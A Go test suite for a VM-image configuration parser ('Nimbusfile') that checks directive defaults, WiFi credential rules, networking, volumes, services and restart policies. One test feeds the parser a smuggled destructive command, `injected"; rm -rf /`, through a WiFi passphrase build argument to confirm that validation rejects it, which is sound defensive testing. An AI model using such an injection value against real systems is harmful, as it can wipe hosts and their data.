package nimbusfile

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeTemp writes content to a temp Nimbusfile and returns its path.
func writeTemp(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "Nimbusfile")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestParseDefaults(t *testing.T) {
	path := writeTemp(t, "")
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.KernelVersion != "latest-stable" {
		t.Errorf("KernelVersion = %q, want latest-stable", hf.KernelVersion)
	}
	if hf.BusyboxVersion != "latest" {
		t.Errorf("BusyboxVersion = %q, want latest", hf.BusyboxVersion)
	}
	if hf.Arch != "amd64" {
		t.Errorf("Arch = %q, want amd64", hf.Arch)
	}
	if hf.VGA {
		t.Error("VGA default should be false")
	}
	if hf.Hostname != "cnimbus" {
		t.Errorf("Hostname = %q, want cnimbus", hf.Hostname)
	}
	if !hf.DHCP {
		t.Error("DHCP default should be true")
	}
	if hf.Format != "iso" {
		t.Errorf("Format = %q, want iso", hf.Format)
	}
	if len(hf.NTP) != 1 || hf.NTP[0] != "pool.ntp.org" {
		t.Errorf("NTP default = %v, want [pool.ntp.org]", hf.NTP)
	}
	wantBaseDir := filepath.Dir(path)
	if hf.BaseDir != wantBaseDir {
		t.Errorf("BaseDir = %q, want %q", hf.BaseDir, wantBaseDir)
	}
}

func TestHardbootDefaultsToNone(t *testing.T) {
	path := writeTemp(t, "")
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.BootProfile != "none" {
		t.Errorf("BootProfile = %q, want none", hf.BootProfile)
	}
}

func TestHardbootInvalidProfile(t *testing.T) {
	path := writeTemp(t, "HARDBOOT bogus\n")
	_, err := Parse(path, nil)
	if err == nil || !strings.Contains(err.Error(), "HARDBOOT must be") {
		t.Fatalf("err = %v, want HARDBOOT validation error", err)
	}
}

func TestHardbootEth(t *testing.T) {
	path := writeTemp(t, "HARDBOOT eth\n")
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.BootProfile != "eth" {
		t.Errorf("BootProfile = %q, want eth", hf.BootProfile)
	}
}

// TestHardbootEthPlusWifi covers the combined boot profile: both driver
// families requested explicitly in one Nimbusfile, same WIFI/WIFIPSK/
// WIFICOUNTRY requirement "wifi" alone already has.
func TestHardbootEthPlusWifi(t *testing.T) {
	content := `
HARDBOOT eth+wifi
WIFI MyNetwork
WIFIPSK correcthorsebattery
WIFICOUNTRY BR
`
	path := writeTemp(t, content)
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.BootProfile != "eth+wifi" {
		t.Errorf("BootProfile = %q, want eth+wifi", hf.BootProfile)
	}
	if hf.WiFiSSID != "MyNetwork" {
		t.Errorf("WiFiSSID = %q", hf.WiFiSSID)
	}
	if hf.WiFiPSK != "correcthorsebattery" {
		t.Errorf("WiFiPSK = %q", hf.WiFiPSK)
	}
	if hf.WiFiCountry != "BR" {
		t.Errorf("WiFiCountry = %q", hf.WiFiCountry)
	}
}

// TestHardbootEthPlusWifiRequiresWIFI mirrors TestHardbootWifiRequiresWIFI:
// "eth+wifi" must enforce the exact same "WIFI is mandatory" rule "wifi"
// alone does -- the WiFi driver stack with no network to associate with
// is never what's meant, regardless of which spelling requested it.
func TestHardbootEthPlusWifiRequiresWIFI(t *testing.T) {
	path := writeTemp(t, "HARDBOOT eth+wifi\nWIFIPSK correcthorsebattery\nWIFICOUNTRY BR\n")
	_, err := Parse(path, nil)
	if err == nil || !strings.Contains(err.Error(), "WIFI") {
		t.Fatalf("err = %v, want missing-WIFI error", err)
	}
}

// TestWifiDirectivesAcceptHardbootEthPlusWifi confirms the cross-directive
// check (validateWiFiCrossRefs) treats "eth+wifi" as satisfying "a WiFi
// profile is present", not just the exact string "wifi" -- this is the
// specific behavior the combined value's whole point depends on.
func TestWifiDirectivesAcceptHardbootEthPlusWifi(t *testing.T) {
	content := "HARDBOOT eth+wifi\nWIFI MyNetwork\nWIFIPSK correcthorsebattery\nWIFICOUNTRY BR\n"
	path := writeTemp(t, content)
	if _, err := Parse(path, nil); err != nil {
		t.Fatalf("HARDBOOT eth+wifi with all three WiFi directives set should parse cleanly, got: %v", err)
	}
}

func TestHardbootWifiFull(t *testing.T) {
	content := `
HARDBOOT wifi
WIFI MyNetwork
WIFIPSK correcthorsebattery
WIFICOUNTRY BR
`
	path := writeTemp(t, content)
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.BootProfile != "wifi" {
		t.Errorf("BootProfile = %q, want wifi", hf.BootProfile)
	}
	if hf.WiFiSSID != "MyNetwork" {
		t.Errorf("WiFiSSID = %q", hf.WiFiSSID)
	}
	if hf.WiFiPSK != "correcthorsebattery" {
		t.Errorf("WiFiPSK = %q", hf.WiFiPSK)
	}
	if hf.WiFiCountry != "BR" {
		t.Errorf("WiFiCountry = %q", hf.WiFiCountry)
	}
}

func TestHardbootWifiAcceptsHexPSK(t *testing.T) {
	hexPSK := strings.Repeat("ab", 32) // 64 hex chars
	content := "HARDBOOT wifi\nWIFI MyNetwork\nWIFIPSK " + hexPSK + "\nWIFICOUNTRY US\n"
	path := writeTemp(t, content)
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.WiFiPSK != hexPSK {
		t.Errorf("WiFiPSK = %q", hf.WiFiPSK)
	}
}

func TestHardbootWifiRequiresWIFI(t *testing.T) {
	path := writeTemp(t, "HARDBOOT wifi\nWIFIPSK correcthorsebattery\nWIFICOUNTRY BR\n")
	_, err := Parse(path, nil)
	if err == nil || !strings.Contains(err.Error(), "WIFI") {
		t.Fatalf("err = %v, want missing-WIFI error", err)
	}
}

func TestHardbootWifiRequiresWIFIPSK(t *testing.T) {
	path := writeTemp(t, "HARDBOOT wifi\nWIFI MyNetwork\nWIFICOUNTRY BR\n")
	_, err := Parse(path, nil)
	if err == nil || !strings.Contains(err.Error(), "WIFIPSK") {
		t.Fatalf("err = %v, want missing-WIFIPSK error", err)
	}
}

func TestHardbootWifiRequiresWIFICOUNTRY(t *testing.T) {
	path := writeTemp(t, "HARDBOOT wifi\nWIFI MyNetwork\nWIFIPSK correcthorsebattery\n")
	_, err := Parse(path, nil)
	if err == nil || !strings.Contains(err.Error(), "WIFICOUNTRY") {
		t.Fatalf("err = %v, want missing-WIFICOUNTRY error", err)
	}
}

func TestWifiDirectivesRequireHardbootWifi(t *testing.T) {
	tests := []string{
		"WIFI MyNetwork\n",
		"WIFIPSK correcthorsebattery\n",
		"WIFICOUNTRY BR\n",
		"HARDBOOT eth\nWIFI MyNetwork\n",
		"HARDBOOT none\nWIFICOUNTRY BR\n",
	}
	for _, content := range tests {
		path := writeTemp(t, content)
		_, err := Parse(path, nil)
		if err == nil || !strings.Contains(err.Error(), "HARDBOOT wifi") {
			t.Errorf("content %q: err = %v, want HARDBOOT-wifi-required error", content, err)
		}
	}
}

func TestWifiSSIDValidation(t *testing.T) {
	tests := []struct {
		ssid    string
		wantErr bool
	}{
		{"MyNetwork", false},
		{strings.Repeat("a", 32), false},
		{strings.Repeat("a", 33), true}, // exceeds 32 bytes
		{`My"Network`, true},            // quote breakout
		{`My\Network`, true},            // backslash
	}
	for _, tt := range tests {
		err := validateWiFiSSID(tt.ssid)
		if (err != nil) != tt.wantErr {
			t.Errorf("validateWiFiSSID(%q) err = %v, wantErr %v", tt.ssid, err, tt.wantErr)
		}
	}
}

func TestWifiPSKValidation(t *testing.T) {
	tests := []struct {
		psk     string
		wantErr bool
	}{
		{"correcthorsebattery", false},
		{strings.Repeat("a", 64), false},      // 64 'a's is valid hex -- pre-derived-key branch
		{"short", true},                       // < 8 chars
		{strings.Repeat("x", 64), true},       // not hex, and 64 > the 63-char passphrase max
		{strings.Repeat("a", 64) + "z", true}, // 65 chars, not hex length, exceeds 63
		{`bad"psk"quote`, true},
	}
	for _, tt := range tests {
		err := validateWiFiPSK(tt.psk)
		if (err != nil) != tt.wantErr {
			t.Errorf("validateWiFiPSK(%q) err = %v, wantErr %v", tt.psk, err, tt.wantErr)
		}
	}
}

func TestWifiCountryValidation(t *testing.T) {
	tests := []struct {
		country string
		wantErr bool
	}{
		{"BR", false},
		{"US", false},
		{"br", true},  // must be uppercase
		{"BRA", true}, // must be exactly 2 letters
		{"", true},
	}
	for _, tt := range tests {
		err := validateWiFiCountry(tt.country)
		if (err != nil) != tt.wantErr {
			t.Errorf("validateWiFiCountry(%q) err = %v, wantErr %v", tt.country, err, tt.wantErr)
		}
	}
}

func TestWifiPSKInjectionViaBuildArg(t *testing.T) {
	content := "ARG WIFI_PSK\nHARDBOOT wifi\nWIFI MyNetwork\nWIFIPSK ${WIFI_PSK}\nWIFICOUNTRY BR\n"
	path := writeTemp(t, content)
	_, err := Parse(path, map[string]string{"WIFI_PSK": `injected"; rm -rf /`})
	if err == nil || !strings.Contains(err.Error(), "WIFIPSK") {
		t.Fatalf("err = %v, want WIFIPSK validation error for injected value", err)
	}
}

func TestParseAllDirectives(t *testing.T) {
	content := `
KERNEL 6.9.4
BUSYBOX 1.36.1
ARCH arm64
VGA true
HOSTNAME myvm
DHCP false
IP 192.168.1.50 255.255.255.0 192.168.1.1
FORMAT raw
USER app
VOLUME /dev/vda /data
ENV KEY=VALUE
ENV OTHER=1
FIREWALL -P INPUT DROP
COPY ./a /usr/bin/a
ADD ./b.tar.gz /opt
ENTRYPOINT /usr/bin/a
CMD --flag value
SERVICE sidecar /usr/bin/sidecar --x
AGENT http://example.com/kv 10
`
	path := writeTemp(t, content)
	hf, err := Parse(path, nil)
	if err != nil {
		t.Fatal(err)
	}

	if hf.KernelVersion != "6.9.4" {
		t.Errorf("KernelVersion = %q", hf.KernelVersion)
	}
	if hf.BusyboxVersion != "1.36.1" {
		t.Errorf("BusyboxVersion = %q", hf.BusyboxVersion)
	}
	if hf.Arch != "arm64" {
		t.Errorf("Arch = %q", hf.Arch)
	}
	if !hf.VGA {
		t.Error("VGA should be true")
	}
	if hf.Hostname != "myvm" {
		t.Errorf("Hostname = %q", hf.Hostname)
	}
	if hf.DHCP {
		t.Error("DHCP should be false")
	}
	if hf.StaticIP == nil || hf.StaticIP.Address != "192.168.1.50" || hf.StaticIP.Netmask != "255.255.255.0" || hf.StaticIP.Gateway != "192.168.1.1" {
		t.Errorf("StaticIP = %+v", hf.StaticIP)
	}
	if hf.Format != "raw" {
		t.Errorf("Format = %q", hf.Format)
	}
	if hf.User != "app" {
		t.Errorf("User = %q", hf.User)
	}
	if len(hf.Volumes) != 1 || hf.Volumes[0].Device != "/dev/vda" || hf.Volumes[0].Mountpoint != "/data" || hf.Volumes[0].FSType != "vfat" {
		t.Errorf("Volumes = %+v", hf.Volumes)
	}
	wantEnv := []EnvVar{{Key: "KEY", Value: "VALUE"}, {Key: "OTHER", Value: "1"}}
	if len(hf.Env) != len(wantEnv) || hf.Env[0] != wantEnv[0] || hf.Env[1] != wantEnv[1] {
		t.Errorf("Env = %+v, want %+v", hf.Env, wantEnv)
	}
	if len(hf.Firewall) != 1 || hf.Firewall[0] != "-P INPUT DROP" {
		t.Errorf("Firewall = %v", hf.Firewall)
	}
	if len(hf.Copies) != 2 {
		t.Fatalf("Copies = %+v, want 2 entries", hf.Copies)
	}
	if hf.Copies[0].Src != "./a" || hf.Copies[0].Dest != "/usr/bin/a" || hf.Copies[0].IsAdd || hf.Copies[0].IsURL {
		t.Errorf("Copies[0] = %+v", hf.Copies[0])
	}
	if hf.Copies[1].Src != "./b.tar.gz" || hf.Copies[1].Dest != "/opt" || !hf.Copies[1].IsAdd {
		t.Errorf("Copies[1] = %+v", hf.Copies[1])
	}
	if len(hf.Entrypoint) != 1 || hf.Entrypoint[0] != "/usr/bin/a" {
		t.Errorf("Entrypoint = %v", hf.Entrypoint)
	}
	if len(hf.Cmd) != 2 || hf.Cmd[0] != "--flag" || hf.Cmd[1] != "value" {
		t.Errorf("Cmd = %v", hf.Cmd)
	}
	if len(hf.Services) != 1 || hf.Services[0].Name != "sidecar" || len(hf.Services[0].Argv) != 2 {
		t.Errorf("Services = %+v", hf.Services)
	}
	if hf.Agent == nil || hf.Agent.Kind != "http" || hf.Agent.URL != "http://example.com/kv" || hf.Agent.Interval != "10" {
		t.Errorf("Agent = %+v", hf.Agent)
	}
}

func TestAgentVBoxGuest(t *testing.T) {
	hf, err := Parse(writeTemp(t, "AGENT vboxguest /cnimbus/message 3\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Agent == nil || hf.Agent.Kind != "vboxguest" || hf.Agent.URL != "/cnimbus/message" || hf.Agent.Interval != "3" {
		t.Errorf("Agent = %+v", hf.Agent)
	}
}

func TestAgentDefaultInterval(t *testing.T) {
	hf, err := Parse(writeTemp(t, "AGENT http://x/kv\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Agent.Interval != "5" {
		t.Errorf("default interval = %q, want 5", hf.Agent.Interval)
	}
}

func TestAgentDuplicateIsError(t *testing.T) {
	_, err := Parse(writeTemp(t, "AGENT http://a/kv\nAGENT http://b/kv\n"), nil)
	if err == nil {
		t.Fatal("expected an error for duplicate AGENT directives")
	}
	if !strings.Contains(err.Error(), "already set") {
		t.Errorf("error = %v, want mention of AGENT already set", err)
	}
}

func TestNTPPrecedence(t *testing.T) {
	tests := []struct {
		name    string
		content string
		want    []string
	}{
		{"default", "", []string{"pool.ntp.org"}},
		{"single override", "NTP 1.ntp.org\n", []string{"1.ntp.org"}},
		{"multiple appends", "NTP 1.ntp.org\nNTP 2.ntp.org\n", []string{"1.ntp.org", "2.ntp.org"}},
		{"false disables", "NTP false\n", nil},
		{"false then explicit re-enables with only that server", "NTP false\nNTP 1.ntp.org\n", []string{"1.ntp.org"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hf, err := Parse(writeTemp(t, tt.content), nil)
			if err != nil {
				t.Fatal(err)
			}
			if len(hf.NTP) != len(tt.want) {
				t.Fatalf("NTP = %v, want %v", hf.NTP, tt.want)
			}
			for i := range tt.want {
				if hf.NTP[i] != tt.want[i] {
					t.Errorf("NTP[%d] = %q, want %q", i, hf.NTP[i], tt.want[i])
				}
			}
		})
	}
}

func TestIPValidation(t *testing.T) {
	tests := []struct {
		name    string
		content string
		wantErr bool
	}{
		{"valid", "IP 192.168.1.50 255.255.255.0 192.168.1.1\n", false},
		{"valid ipv6", "IP ::1 ffff:: ::2\n", false},
		{"bad address", "IP banana 255.255.255.0 192.168.1.1\n", true},
		{"bad netmask", "IP 192.168.1.50 999 192.168.1.1\n", true},
		{"bad gateway", "IP 192.168.1.50 255.255.255.0 xyz\n", true},
		{"wrong field count", "IP 192.168.1.50 255.255.255.0\n", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Parse(writeTemp(t, tt.content), nil)
			if (err != nil) != tt.wantErr {
				t.Errorf("err = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestExecFormVsShellForm(t *testing.T) {
	hf, err := Parse(writeTemp(t, `ENTRYPOINT ["/usr/bin/a", "arg with spaces"]`+"\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"/usr/bin/a", "arg with spaces"}
	if len(hf.Entrypoint) != 2 || hf.Entrypoint[0] != want[0] || hf.Entrypoint[1] != want[1] {
		t.Errorf("Entrypoint = %v, want %v", hf.Entrypoint, want)
	}

	hf2, err := Parse(writeTemp(t, "ENTRYPOINT /usr/bin/a --flag val\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	want2 := []string{"/usr/bin/a", "--flag", "val"}
	if len(hf2.Entrypoint) != 3 {
		t.Fatalf("Entrypoint = %v, want %v", hf2.Entrypoint, want2)
	}
}

func TestExecFormInvalidJSON(t *testing.T) {
	_, err := Parse(writeTemp(t, `ENTRYPOINT ["unterminated`+"\n"), nil)
	if err == nil {
		t.Fatal("expected error for invalid JSON exec form")
	}
}

func TestLineContinuation(t *testing.T) {
	content := "HOSTNAME myvm\n" +
		"ENTRYPOINT /usr/bin/a \\\n" +
		"  --flag1 \\\n" +
		"  --flag2\n" +
		"CMD ok\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"/usr/bin/a", "--flag1", "--flag2"}
	if len(hf.Entrypoint) != 3 {
		t.Fatalf("Entrypoint = %v, want %v", hf.Entrypoint, want)
	}
	for i, w := range want {
		if hf.Entrypoint[i] != w {
			t.Errorf("Entrypoint[%d] = %q, want %q", i, hf.Entrypoint[i], w)
		}
	}
}

// TestErrorLineNumberAfterContinuation is a regression test for a bug
// where parse errors after a `\`-continued block reported the post-join
// logical line index instead of the real physical line number.
func TestErrorLineNumberAfterContinuation(t *testing.T) {
	content := "HOSTNAME myvm\n" + // line 1
		"ENTRYPOINT /usr/bin/a \\\n" + // line 2 (continues)
		"  --flag1 \\\n" + // line 3 (continues)
		"  --flag2\n" + // line 4 (end of logical line 2)
		"ARCH invalid\n" // line 5 -- the actual error

	_, err := Parse(writeTemp(t, content), nil)
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.HasPrefix(err.Error(), "line 5:") {
		t.Errorf("error = %q, want it to start with \"line 5:\"", err.Error())
	}
}

func TestErrorLineNumberBeforeAnyContinuation(t *testing.T) {
	content := "HOSTNAME myvm\nARCH invalid\n"
	_, err := Parse(writeTemp(t, content), nil)
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.HasPrefix(err.Error(), "line 2:") {
		t.Errorf("error = %q, want it to start with \"line 2:\"", err.Error())
	}
}

func TestCommentsAndBlankLinesIgnored(t *testing.T) {
	content := "# a comment\n\nHOSTNAME myvm\n\n# another\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Hostname != "myvm" {
		t.Errorf("Hostname = %q", hf.Hostname)
	}
}

func TestUnknownDirective(t *testing.T) {
	_, err := Parse(writeTemp(t, "BOGUS foo\n"), nil)
	if err == nil || !strings.Contains(err.Error(), "unknown directive") {
		t.Errorf("err = %v, want unknown directive error", err)
	}
}

func TestParseNonexistentFile(t *testing.T) {
	_, err := Parse(filepath.Join(t.TempDir(), "does-not-exist"), nil)
	if err == nil {
		t.Fatal("expected error for nonexistent file")
	}
}

// requiredValueDirectives are directives that must reject an empty
// argument; table-driven so adding a directive here isn't easy to forget.
func TestDirectivesRequireArguments(t *testing.T) {
	tests := []string{
		"KERNEL", "BUSYBOX", "HOSTNAME", "USER", "NTP", "FIREWALL", "FIREWALL6",
	}
	for _, directive := range tests {
		t.Run(directive, func(t *testing.T) {
			_, err := Parse(writeTemp(t, directive+"\n"), nil)
			if err == nil {
				t.Errorf("%s with no argument should error", directive)
			}
		})
	}
}

func TestArchValidation(t *testing.T) {
	if _, err := Parse(writeTemp(t, "ARCH mips\n"), nil); err == nil {
		t.Error("expected error for invalid ARCH")
	}
	hf, err := Parse(writeTemp(t, "ARCH arm64\n"), nil)
	if err != nil || hf.Arch != "arm64" {
		t.Errorf("ARCH arm64 failed: %v, %+v", err, hf)
	}
}

func TestFormatValidation(t *testing.T) {
	if _, err := Parse(writeTemp(t, "FORMAT qcow2\n"), nil); err == nil {
		t.Error("expected error for invalid FORMAT")
	}
}

func TestFormatAcceptsVHD(t *testing.T) {
	hf, err := Parse(writeTemp(t, "FORMAT vhd\n"), nil)
	if err != nil {
		t.Fatalf("FORMAT vhd should be accepted: %v", err)
	}
	if hf.Format != "vhd" {
		t.Errorf("Format = %q, want %q", hf.Format, "vhd")
	}
}

func TestBooleanDirectivesRejectGarbage(t *testing.T) {
	if _, err := Parse(writeTemp(t, "VGA maybe\n"), nil); err == nil {
		t.Error("expected error for invalid VGA boolean")
	}
	if _, err := Parse(writeTemp(t, "DHCP maybe\n"), nil); err == nil {
		t.Error("expected error for invalid DHCP boolean")
	}
}

func TestVolumeRequiresBothFields(t *testing.T) {
	if _, err := Parse(writeTemp(t, "VOLUME /dev/vda\n"), nil); err == nil {
		t.Error("expected error for VOLUME missing mountpoint")
	}
}

func TestVolumeMultipleAreRepeatable(t *testing.T) {
	content := "VOLUME /dev/vda /data\nVOLUME /dev/vdb /backup ext4\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(hf.Volumes) != 2 {
		t.Fatalf("Volumes = %+v, want 2 entries", hf.Volumes)
	}
	if hf.Volumes[0].FSType != "vfat" {
		t.Errorf("Volumes[0].FSType = %q, want default vfat", hf.Volumes[0].FSType)
	}
	if hf.Volumes[1].Device != "/dev/vdb" || hf.Volumes[1].Mountpoint != "/backup" || hf.Volumes[1].FSType != "ext4" {
		t.Errorf("Volumes[1] = %+v", hf.Volumes[1])
	}
}

func TestVolumeInvalidFSType(t *testing.T) {
	if _, err := Parse(writeTemp(t, "VOLUME /dev/vda /data btrfs\n"), nil); err == nil {
		t.Error("expected error for unsupported fstype")
	}
}

// T93: "required" is a trailing modifier, valid both with and without an
// explicit fstype, and must not be confused for one.
func TestVolumeRequiredModifier(t *testing.T) {
	content := "VOLUME /dev/vda /data required\nVOLUME /dev/vdb /backup ext4 required\nVOLUME /dev/vdc /optional\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(hf.Volumes) != 3 {
		t.Fatalf("Volumes = %+v, want 3 entries", hf.Volumes)
	}
	if !hf.Volumes[0].Required || hf.Volumes[0].FSType != "vfat" {
		t.Errorf("Volumes[0] = %+v, want Required=true FSType=vfat", hf.Volumes[0])
	}
	if !hf.Volumes[1].Required || hf.Volumes[1].FSType != "ext4" {
		t.Errorf("Volumes[1] = %+v, want Required=true FSType=ext4", hf.Volumes[1])
	}
	if hf.Volumes[2].Required {
		t.Errorf("Volumes[2] = %+v, want Required=false (no trailing modifier)", hf.Volumes[2])
	}
}

func TestENVRequiresEquals(t *testing.T) {
	if _, err := Parse(writeTemp(t, "ENV NOEQUALS\n"), nil); err == nil {
		t.Error("expected error for ENV without '='")
	}
}

func TestENVAllowsEmptyValue(t *testing.T) {
	hf, err := Parse(writeTemp(t, "ENV KEY=\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(hf.Env) != 1 || hf.Env[0].Key != "KEY" || hf.Env[0].Value != "" {
		t.Errorf("Env = %+v", hf.Env)
	}
}

func TestServiceRequiresNameAndCommand(t *testing.T) {
	if _, err := Parse(writeTemp(t, "SERVICE onlyname\n"), nil); err == nil {
		t.Error("expected error for SERVICE missing command")
	}
}

func TestAgentIntervalMustBeNumeric(t *testing.T) {
	if _, err := Parse(writeTemp(t, "AGENT http://x/kv notanumber\n"), nil); err == nil {
		t.Error("expected error for non-numeric AGENT interval")
	}
	if _, err := Parse(writeTemp(t, "AGENT vboxguest /prop notanumber\n"), nil); err == nil {
		t.Error("expected error for non-numeric AGENT vboxguest interval")
	}
}

func TestCopyAddURLHandling(t *testing.T) {
	hf, err := Parse(writeTemp(t, "ADD https://example.com/f.tar.gz /opt\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if !hf.Copies[0].IsURL || !hf.Copies[0].IsAdd {
		t.Errorf("Copies[0] = %+v, want IsURL and IsAdd", hf.Copies[0])
	}
}

func TestCaseInsensitiveDirectives(t *testing.T) {
	hf, err := Parse(writeTemp(t, "hostname myvm\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Hostname != "myvm" {
		t.Errorf("Hostname = %q, want case-insensitive directive to still work", hf.Hostname)
	}
}

func TestDNS(t *testing.T) {
	hf, err := Parse(writeTemp(t, "DNS 8.8.8.8\nDNS 1.1.1.1\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"8.8.8.8", "1.1.1.1"}
	if len(hf.DNS) != 2 || hf.DNS[0] != want[0] || hf.DNS[1] != want[1] {
		t.Errorf("DNS = %v, want %v", hf.DNS, want)
	}
	if _, err := Parse(writeTemp(t, "DNS notanip\n"), nil); err == nil {
		t.Error("expected error for invalid DNS address")
	}
}

func TestWorkdir(t *testing.T) {
	hf, err := Parse(writeTemp(t, "WORKDIR /app\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Workdir != "/app" {
		t.Errorf("Workdir = %q, want /app", hf.Workdir)
	}
	if _, err := Parse(writeTemp(t, "WORKDIR\n"), nil); err == nil {
		t.Error("expected error for WORKDIR with no path")
	}
}

func TestLabel(t *testing.T) {
	hf, err := Parse(writeTemp(t, "LABEL version=1.0\nLABEL team=infra\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []EnvVar{{Key: "version", Value: "1.0"}, {Key: "team", Value: "infra"}}
	if len(hf.Labels) != 2 || hf.Labels[0] != want[0] || hf.Labels[1] != want[1] {
		t.Errorf("Labels = %+v, want %+v", hf.Labels, want)
	}
	if _, err := Parse(writeTemp(t, "LABEL noequals\n"), nil); err == nil {
		t.Error("expected error for LABEL without '='")
	}
}

func TestExpose(t *testing.T) {
	hf, err := Parse(writeTemp(t, "EXPOSE 8080\nEXPOSE 53/udp\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []ExposedPort{{Port: 8080, Proto: "tcp"}, {Port: 53, Proto: "udp"}}
	if len(hf.Exposed) != 2 || hf.Exposed[0] != want[0] || hf.Exposed[1] != want[1] {
		t.Errorf("Exposed = %+v, want %+v", hf.Exposed, want)
	}
	tests := []string{"EXPOSE 0\n", "EXPOSE 70000\n", "EXPOSE 80/sctp\n", "EXPOSE notaport\n"}
	for _, content := range tests {
		if _, err := Parse(writeTemp(t, content), nil); err == nil {
			t.Errorf("expected error for %q", content)
		}
	}
}

func TestHealthcheck(t *testing.T) {
	hf, err := Parse(writeTemp(t, "HEALTHCHECK --interval=10 --retries=5 /usr/bin/healthcheck.sh\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Healthcheck == nil {
		t.Fatal("expected Healthcheck to be set")
	}
	if hf.Healthcheck.Interval != "10" || hf.Healthcheck.Retries != "5" {
		t.Errorf("Healthcheck = %+v, want interval=10 retries=5", hf.Healthcheck)
	}
	if len(hf.Healthcheck.Argv) != 1 || hf.Healthcheck.Argv[0] != "/usr/bin/healthcheck.sh" {
		t.Errorf("Healthcheck.Argv = %v", hf.Healthcheck.Argv)
	}
}

func TestHealthcheckDefaults(t *testing.T) {
	hf, err := Parse(writeTemp(t, "HEALTHCHECK /bin/true\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Healthcheck.Interval != "30" || hf.Healthcheck.Retries != "3" {
		t.Errorf("Healthcheck defaults = %+v, want interval=30 retries=3", hf.Healthcheck)
	}
}

func TestHealthcheckFlagsAnyOrder(t *testing.T) {
	hf, err := Parse(writeTemp(t, "HEALTHCHECK --retries=2 --interval=15 /bin/true\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Healthcheck.Interval != "15" || hf.Healthcheck.Retries != "2" {
		t.Errorf("Healthcheck = %+v", hf.Healthcheck)
	}
}

func TestHealthcheckInvalidFlag(t *testing.T) {
	if _, err := Parse(writeTemp(t, "HEALTHCHECK --interval=notanumber /bin/true\n"), nil); err == nil {
		t.Error("expected error for non-numeric --interval")
	}
}

func TestRestartEntrypointAndService(t *testing.T) {
	content := "SERVICE sidecar /bin/true\nRESTART entrypoint on-failure\nRESTART sidecar no\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.EntrypointRestart != "on-failure" {
		t.Errorf("EntrypointRestart = %q, want on-failure", hf.EntrypointRestart)
	}
	if hf.Services[0].Restart != "no" {
		t.Errorf("Services[0].Restart = %q, want no", hf.Services[0].Restart)
	}
}

func TestRestartDefaultsToAlways(t *testing.T) {
	hf, err := Parse(writeTemp(t, ""), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.EntrypointRestart != "always" {
		t.Errorf("EntrypointRestart default = %q, want always", hf.EntrypointRestart)
	}
}

func TestRestartUnknownServiceErrors(t *testing.T) {
	if _, err := Parse(writeTemp(t, "RESTART ghost no\n"), nil); err == nil {
		t.Error("expected error targeting a SERVICE that was never declared")
	}
}

func TestRestartInvalidPolicy(t *testing.T) {
	if _, err := Parse(writeTemp(t, "RESTART entrypoint sometimes\n"), nil); err == nil {
		t.Error("expected error for an invalid RESTART policy")
	}
}

func TestRestartBeforeServiceDeclarationErrors(t *testing.T) {
	if _, err := Parse(writeTemp(t, "RESTART sidecar no\nSERVICE sidecar /bin/true\n"), nil); err == nil {
		t.Error("expected error: RESTART must come after the SERVICE it targets")
	}
}

func TestCopyChmod(t *testing.T) {
	hf, err := Parse(writeTemp(t, "COPY --chmod=0644 ./app.conf /etc/app.conf\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Copies[0].Chmod != 0o644 {
		t.Errorf("Chmod = %o, want 0644", hf.Copies[0].Chmod)
	}
	if hf.Copies[0].Src != "./app.conf" || hf.Copies[0].Dest != "/etc/app.conf" {
		t.Errorf("Copies[0] = %+v", hf.Copies[0])
	}
}

func TestCopyNoChmodDefaultsToZero(t *testing.T) {
	hf, err := Parse(writeTemp(t, "COPY ./a /b\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Copies[0].Chmod != 0 {
		t.Errorf("Chmod = %o, want 0 (unset)", hf.Copies[0].Chmod)
	}
}

func TestCopyChmodInvalid(t *testing.T) {
	if _, err := Parse(writeTemp(t, "COPY --chmod=9 ./a /b\n"), nil); err == nil {
		t.Error("expected error for invalid octal --chmod value")
	}
	if _, err := Parse(writeTemp(t, "COPY --chmod=0 ./a /b\n"), nil); err == nil {
		t.Error("expected error for --chmod=0")
	}
}

